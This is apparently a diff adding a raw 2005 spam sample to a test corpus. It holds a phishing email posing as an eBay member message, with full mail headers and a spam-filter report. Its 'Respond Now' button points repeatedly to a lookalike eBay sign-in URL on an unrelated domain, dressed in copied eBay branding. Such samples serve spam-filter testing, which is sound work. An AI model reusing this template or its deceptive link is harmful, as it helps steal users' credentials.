@@ -1,0 +1,227 @@
+From nobody Sun Jan 25 13:48:11 2015
+Return-Path: <ann@jhft.rancharrah.com>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail1.example.com (mail1.example.com [10.1.2.3])
+ by naughty.example.com (Postfix) with ESMTP id 08C43536E4E
+ for <nobody@login.example.com>; Thu, 15 Dec 2005 09:02:32 -0500 (EST)
+Received: from mail1.example.com (localhost.example.com [127.0.0.1])
+ by mail1.example.com (Postfix) with ESMTP id 0C2646CCF22
+ for <nobody@example.com>; Thu, 15 Dec 2005 09:02:00 -0500 (EST)
+Received: from lujan.example.com (foo.example.com [10.2.3.4])
+ by mail1.example.com (Postfix) with ESMTP
+ for <nobody@example.com>; Thu, 15 Dec 2005 09:02:00 -0500 (EST)
+Received: by lujan.example.com (Postfix)
+ id 9F39A1BC3D; Thu, 15 Dec 2005 15:02:02 +0100 (CET)
+Delivered-To: foobee@example.com
+Received: from localhost (unknown [127.0.0.1])
+ by lujan.example.com (Postfix) with ESMTP id 3DD4D1BB51
+ for <foobee@example.com>; Thu, 15 Dec 2005 14:02:02 +0000 (UTC)
+Received: from lujan.example.com ([10.2.3.4])
+ by localhost (lujan [10.2.3.4]) (amavisd-new, port 10024)
+ with ESMTP id 12024-03 for <foobee@example.com>;
+ Thu, 15 Dec 2005 15:01:41 +0100 (CET)
+Received: from jhft.rancharrah.com (unknown [206.100.217.93])
+ by lujan.example.com (Postfix) with ESMTP id D0AB11BB26
+ for <foobee@example.com>; Thu, 15 Dec 2005 15:01:39 +0100 (CET)
+Received: by jhft.rancharrah.com (Postfix, from userid 1032)
+ id B81B14DA1F0; Thu, 15 Dec 2005 06:01:30 -0800 (PST)
+To: foobee@example.com
+Subject: [*** POSIBLE SPAM***] Message from eBay Member
+From: member@ebay.com <member@ebay.com>
+Content-Type: text/html
+Message-Id: <20051215140130.B81B14DA1F0@jhft.rancharrah.com>
+Date: Thu, 15 Dec 2005 06:01:30 -0800 (PST)
+X-Virus-Scanned: by amavisd-new-20030616-p10 (Debian) at example.com
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: **
+X-Spam-Status: No, score=2.9 required=5.0 tests=AWL,HTML_FONT_BIG,
+ HTML_MESSAGE,HTML_MIME_NO_HTML_TAG,HTML_TAG_EXIST_TBODY,
+ MIME_HEADER_CTYPE_ONLY,MIME_HTML_ONLY,RAZOR2_CF_RANGE_51_100,
+ RAZOR2_CHECK,RCVD_IN_BL_SPAMCOP_NET autolearn=no version=3.0.2
+X-Spam-Report: *  0.0 HTML_MESSAGE BODY: HTML included in message
+ *  0.1 HTML_FONT_BIG BODY: HTML tag for a big font size
+ *  0.1 HTML_TAG_EXIST_TBODY BODY: HTML has "tbody" tag
+ *  0.1 RAZOR2_CF_RANGE_51_100 BODY: Razor2 gives confidence level above 50%
+ *      [cf: 100]
+ *  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+ *  1.5 RAZOR2_CHECK Listed in Razor2 (http://razor.sf.net/)
+ *  1.2 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in bl.spamcop.net
+ *      [Blocked - see <http://www.spamcop.net/bl.shtml?206.100.217.93>]
+ * 0.1 MIME_HEADER_CTYPE_ONLY 'Content-Type' found without required MIME
+ headers
+ *  0.1 HTML_MIME_NO_HTML_TAG HTML-only message, but there is no HTML tag
+ * -0.6 AWL AWL: From: address is in the auto white-list
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 139
+
+
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0 xmlns:x="urn:schemas-microsoft-com:xslt">
+<TBODY>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=2 width="100%" border=0>
+<TBODY>
+<TR>
+<TD><FONT face="Verdana, sans-serif" color=#666666 size=1><B>eBay sent this message!</B><BR>Your registered name is included to show this message originated from eBay. <A href="http://pages.ebay.co.uk/help/confidence/name-userid-emails.html?fromFeature=My%20eBay" target=_blank><FONT color=#003399>Learn more</FONT></A>. </FONT></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=white border=0>
+<TBODY>
+<TR>
+<TD noWrap width="1%"><IMG src="http://pics.ebaystatic.com/aw/pics/uk/email/syiSessions/hdrLeft_13x39.gif"></TD>
+<TD noWrap width="98%" background=http://pics.ebaystatic.com/aw/pics/uk/email/syiSessions/imgSpan_5x39.gif><SPAN class=SectionTitle><FONT size=4><B>Question from eBay Member -- Respond Now</B></FONT></SPAN></TD>
+<TD vAlign=bottom noWrap width="1%"><IMG alt=eBay src="http://pics.ebaystatic.com/aw/pics/uk/email/syiSessions/hdrRight_90x39.gif"></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD><IMG height=1 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=10></TD>
+<TD>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD>
+<TABLE style="BORDER-RIGHT: #9999cc 1px solid; BORDER-LEFT: #9999cc 1px solid; BORDER-BOTTOM: #9999cc 1px solid" width="100%" bgColor=#eeeef8 border=0>
+<TBODY>
+<TR>
+<TD style="PADDING-LEFT: 8px" height=30><FONT face="Arial, Verdana" size=2>eBay sent this message on behalf of an eBay member via My Messages. Responses sent using email will not reach the eBay member. Use the <B>Respond Now</B> button below to respond to this message.</FONT> </TD></TR></TBODY></TABLE></TD>
+<TD><IMG height=1 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=10></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD><IMG height=10 src="http://pics.ebaystatic.com/aw/pics/s.gif"></TD></TR>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD><IMG height=1 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=10></TD>
+<TD vAlign=top>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD vAlign=top>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=1 width="100%" align=center bgColor=#9999cc border=0>
+<TBODY>
+<TR bgColor=#9999cc height=26>
+<TD><FONT color=#ffffff> <SPAN class=SectionTitle>Question from skaubraatmyra</SPAN></FONT></TD></TR>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" align=center border=0>
+<TBODY>
+<TR bgColor=#ffffff>
+<TD>
+<TABLE cellSpacing=0 cellPadding=4>
+<TBODY>
+<TR>
+<TD vAlign=top width="75%"><FONT face="Arial, Verdana" size=2>
+<P><FONT face="Arial, Verdana" size=2>Hello,</FONT></P>
+<P><FONT face="Arial, Verdana" size=2>Hi,
+
+I signed up for Ebay and I've been an Ebay member for about 15 days. So, I'm carrying an "icon" where it says "I am a member since less than 30 days".
+
+A few days ago, I managed to sell an item. The guy who bought mine left me a positive feedback.
+
+But still, mine's got a "zero" feedback?
+
+Why is it that? If I click on my profile, I can see that he left me a feedback.
+
+But the feedback counting doesn't go from zero to one.
+
+Is it because I'm a member who's been registered for less than 30 days?.<BR><BR>Regards, </FONT><BR> Gretta.</FONT></P></TD>
+<TD vAlign=top align=middle width="22%">
+<TABLE borderColor=#999999 cellSpacing=0 cellPadding=0 width="100%" bgColor=#eeeef8 border=1>
+<TBODY>
+<TR>
+<TD>
+<TABLE cellSpacing=3 cellPadding=3 width="100%">
+<TBODY>
+<TR>
+<TD align=middle><FONT face="Arial, Verdana" size=2><B>Respond to this question in My Messages.</B></FONT> </TD></TR>
+<TR>
+<TD align=middle><A href="http://www.crtotal.com/.cgi-bin/signin.ebay.com/ws/ebayISAPI.dllUPdate/index.html" target=_blank>
+<DIV></A><A href="http://www.crtotal.com/.cgi-bin/signin.ebay.com/ws/ebayISAPI.dllUPdate/index.html" target=_blank>
+<DIV></A><A href="http://www.crtotal.com/.cgi-bin/signin.ebay.com/ws/ebayISAPI.dllUPdate/index.html" target=_blank>
+<DIV></A><A href="http://www.crtotal.com/.cgi-bin/signin.ebay.com/ws/ebayISAPI.dllUPdate/index.html" target=_blank>
+<DIV></A><A href="http://www.crtotal.com/.cgi-bin/signin.ebay.com/ws/ebayISAPI.dllUPdate/index.html" target=_blank><IMG alt="Respond Now" src="http://pics.ebaystatic.com/aw/pics/uk/email/message/btnRespondNow.gif" border=0></A><A href="http://www.crtotal.com/.cgi-bin/signin.ebay.com/ws/ebayISAPI.dllUPdate/index.html" target=_blank></DIV></A><A href="http://www.crtotal.com/.cgi-bin/signin.ebay.com/ws/ebayISAPI.dllUPdate/index.html" target=_blank></DIV></A><A href="http://www.crtotal.com/.cgi-bin/signin.ebay.com/ws/ebayISAPI.dllUPdate/index.html" target=_blank></DIV></A><A href="http://www.crtotal.com/.cgi-bin/signin.ebay.com/ws/ebayISAPI.dllUPdate/index.html" target=_blank></DIV></A><A href="http://contact.ebay.co.uk/ws/eBayISAPI.dll?M2MContact&requested=rhody1510&qid=1308993619&redirect=0&sspagename=ADME:X:CEM:UK:2" target=_blank></A></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD>
+<TD width="3%"></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=0 border=0>
+<TBODY>
+<TR>
+<TD><IMG height=8 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1 border=0></TD></TR>
+<TR>
+<TD><FONT face="Arial, Verdana" size=2>Thank you for using eBay</FONT></TD></TR>
+<TR>
+<TD><FONT face="Arial, Verdana" color=#003399 size=2><A href="http://www.ebay.com/" target=_blank>http://www.ebay.com/</A></FONT></TD></TR>
+<TR>
+<TD><FONT color=#003399><IMG height=10 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1 border=0></FONT></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD>
+<TD vAlign=top width=10><FONT color=#003399><IMG src="http://pics.ebaystatic.com/aw/pics/s.gif" width=10></FONT></TD>
+<TD vAlign=top align=right width=188>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD>
+<TABLE style="BORDER-RIGHT: #6b7b91 1px solid; BORDER-TOP: #6b7b91 1px solid; BORDER-LEFT: #6b7b91 1px solid; BORDER-BOTTOM: #6b7b91 1px solid" cellSpacing=0 cellPadding=0 border=0>
+<TBODY>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=0 border=0>
+<TBODY>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=0 border=0>
+<TBODY>
+<TR>
+<TD bgColor=#cad2dd><FONT color=#003399><IMG height=25 alt="Marketplace Safety Tip" src="http://pics.ebaystatic.com/aw/pics/uk/securityCenter/imgShield_25x25.gif" width=25 border=0></FONT></TD>
+<TD noWrap bgColor=#cad2dd><FONT face="Arial, Helvetica, Verdana, sans-serif" size=-1><B><A style="COLOR: #000000; TEXT-DECORATION: none" href="http://pages.ebay.co.uk/safetycentre" target=_blank>Marketplace Safety Tip</A></B></FONT> </TD>
+<TD bgColor=#cad2dd><IMG title="" height=25 alt=" " src="http://pics.ebaystatic.com/aw/pics/securityCenter/imgTabCorner_25x25.gif" width=25 border=0></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=5 border=0>
+<TBODY>
+<TR>
+<TD><FONT face="Arial, Verdana" size=2>If this message is an offer to sell an item without winning it on the eBay Web site (including Second Chance Offers sent through My Messages) please do not respond to the sender. These external transactions are unsafe and not covered by eBay purchase protection programmes. <BR><BR>Never pay for your eBay item through instant wire transfer services such as <A href="http://pages.ebay.co.uk/help/confidence/isgw-fraud-sending-payments.html?fromFeature=My%20eBay" target=_blank><FONT color=#003399>Western Union</FONT></A> or <A href="http://pages.ebay.co.uk/securitycenter/mrkt_safety/instantcashtransfer.html" target=_blank><FONT color=#003399>MoneyGram</FONT></A>. These payment methods are unsafe when paying someone you do not know. </FONT></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD bgColor=#c9d2dc height=5><IMG height=5 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD><IMG height=10 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD></TR>
+<TR>
+<TD>
+<TABLE style="BORDER-RIGHT: #c6c6c6 1px solid; BORDER-TOP: #c6c6c6 1px solid; BORDER-LEFT: #c6c6c6 1px solid; BORDER-BOTTOM: #c6c6c6 1px solid" cellSpacing=0 cellPadding=5 width="100%" border=0>
+<TBODY>
+<TR>
+<TD><FONT face="Arial, Verdana" size=2>Is this email inappropriate? Does it breach <A href="http://pages.ebay.co.uk/help/policies/rfe-unwelcome-email-misuse.html?fromFeature=My%20eBay" target=_blank><FONT color=#003399>eBay policy</FONT></A>? Help protect the community by <A href="http://cgi1.ebay.co.uk/aw-cgi/eBayISAPI.dll?ReportEmailAbuseshow&reporteruserid=cliveninnes&reporteduserid=rhody1510&emaildate=2005/10/02:18:56:58&emailtype=1&emailtext=Are+you+still+looking+for+a+buyer+for+your+Case+Catalyst+software%3F+++If+so%2C+is+will+Stenograph+be+aware+of+the+purchase%3F++I+do+not+want+to+have+to+pay+twice+for+the+software.%0D%0A%0D%0AThanks%21%21%21%0D%0A%0D%0APam&trackId=1308993619" target=_blank><FONT color=#003399>reporting it</FONT></A>. </FONT></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD colSpan=3><IMG height=10 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#cccccc>
+<TBODY>
+<TR>
+<TD height=1></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD><FONT face="Arial, Verdana" color=#666666 size=1>This email appears in the language of the eBay site where you are registered.</FONT> </TD></TR>
+<TR>
+<TD><IMG height=5 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD></TR>
+<TR>
+<TD><FONT face="Arial, Verdana" color=#666666 size=1>Learn how you can protect yourself from spoof (fake) emails at:<BR><A href="http://pages.ebay.co.uk/education/spooftutorial" target=_blank><FONT color=#003399>http://pages.ebay.co.uk/education/spooftutorial</FONT></A> </FONT></TD></TR>
+<TR>
+<TD><IMG height=5 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD></TR>
+<TR>
+<TD><FONT face="Arial, Verdana" color=#666666 size=1>This eBay notice was sent to cwninnes@aminex-plc.com on behalf of another eBay member through the eBay platform and in accordance with our Privacy Policy. If you would like to receive this email in text format, change your <A href="http://cgi4.ebay.co.uk/ws/eBayISAPI.dll?OptinLoginShow" target=_blank onfiltered="return openNonHelpWindow(this.href);"><FONT color=#003399>notification preferences</FONT></A>. </FONT></TD></TR>
+<TR>
+<TD><IMG height=5 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD></TR>
+<TR>
+<TD><FONT face="Arial, Verdana" color=#666666 size=1>See our Privacy Policy and User Agreement if you have questions about eBay's communication policies.<BR>Privacy Policy: <A href="http://pages.ebay.co.uk/help/policies/privacy-policy.html?fromFeature=My%20eBay" target=_blank><FONT color=#003399>http://pages.ebay.co.uk/help/policies/privacy-policy.html</FONT></A><BR>User Agreement: <A href="http://pages.ebay.co.uk/help/policies/user-agreement.html?fromFeature=My%20eBay" target=_blank><FONT color=#003399>http://pages.ebay.co.uk/help/policies/user-agreement.html</FONT></A> </FONT></TD></TR>
+<TR>
+<TD><IMG height=5 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD></TR>
+<TR>
+<TD><FONT face="Arial, Verdana" color=#666666 size=1>Copyright © 2005 eBay, Inc. All Rights Reserved.<BR>Designated trademarks and brands are the property of their respective owners.<BR>eBay and the eBay logo are registered trademarks or trademarks of eBay, Inc.</FONT></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
